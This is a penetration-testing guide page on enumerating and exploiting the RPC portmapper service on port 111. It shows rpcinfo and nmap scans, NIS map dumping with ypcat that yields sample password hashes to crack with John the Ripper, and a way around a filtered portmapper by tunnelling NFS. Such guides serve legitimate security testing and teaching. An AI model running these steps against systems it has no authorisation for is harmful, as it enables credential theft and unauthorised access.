111/TCP/UDP - Pentesting Portmapper
Basic Information

Provides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS, or any rpc-based service.

Default port: 111/TCP/UDP, 32771 in Oracle Solaris

PORT    STATE SERVICE
111/tcp open  rpcbind

Enumeration

rpcinfo irked.htb
nmap -sSUC -p111 192.168.10.1

Sometimes it doesn't give you any information, in other occasions you will get something like this:  
Shodan

    port:111 portmap

RPCBind + NFS

If you find the service NFS then probably you will be able to list and download(and maybe upload) files:

Read 2049 - Pentesting NFS service to learn more about how to test this protocol.
NIS

If you find the service ypbindrunning:

You can try to exploit it. Anyway, first of all you will need to guess the NIS "domain name" of the machine (when NIS is installed it's configured a "domain name") and without knowing this domain name you cannot do anything.


Upon obtaining the NIS domain name for the environment (example.org in this case), use the ypwhich command to ping the NIS server and ypcat to obtain sensitive material. You should feed encrypted password hashes into John the Ripper, and once cracked, you can use it to evaluate system access and privileges.

root@kali:~# apt-get install nis
root@kali:~# ypwhich -d example.org 192.168.10.1
potatohead.example.org
root@kali:~# ypcat –d example.org –h 192.168.10.1 passwd.byname
tiff:noR7Bk6FdgcZg:218:101::/export/home/tiff:/bin/bash 
katykat:d.K5tGUWCJfQM:2099:102::/export/home/katykat:/bin/bash 
james:i0na7pfgtxi42:332:100::/export/home/james:/bin/tcsh 
florent:nUNzkxYF0Hbmk:199:100::/export/home/florent:/bin/csh 
dave:pzg1026SzQlwc:182:100::/export/home/dave:/bin/bash 
yumi:ZEadZ3ZaW4v9.:1377:160::/export/home/yumi:/bin/bash

Master file
	

Map(s)
	

Notes

/etc/hosts
	

hosts.byname, hosts.byaddr
	

Contains hostnames and IP details

/etc/passwd
	

passwd.byname, passwd.byuid
	

NIS user password file

/etc/group
	

group.byname, group.bygid
	

NIS group file

/usr/lib/aliases
	

mail.aliases
	

Details mail aliases
RPC Users

If you find the rusersd service listed like this:

You could enumerate users of the box. To learn how read 1026 - Pentesting Rsusersd.
Bypass Filtered Portmapper port

If during a nmap scan you see open ports like NFS but the port 111 is filtered, you won't be able to exploit those ports.
But, if you can simulate a locally a portmapper service and you tunnel the NFS port from your machine to the victim one, you will be able to use regular tools to exploit those services.
More information in https://medium.com/@sebnemK/how-to-bypass-filtered-portmapper-port-111-27cee52416bc​
Shodan

    Portmap
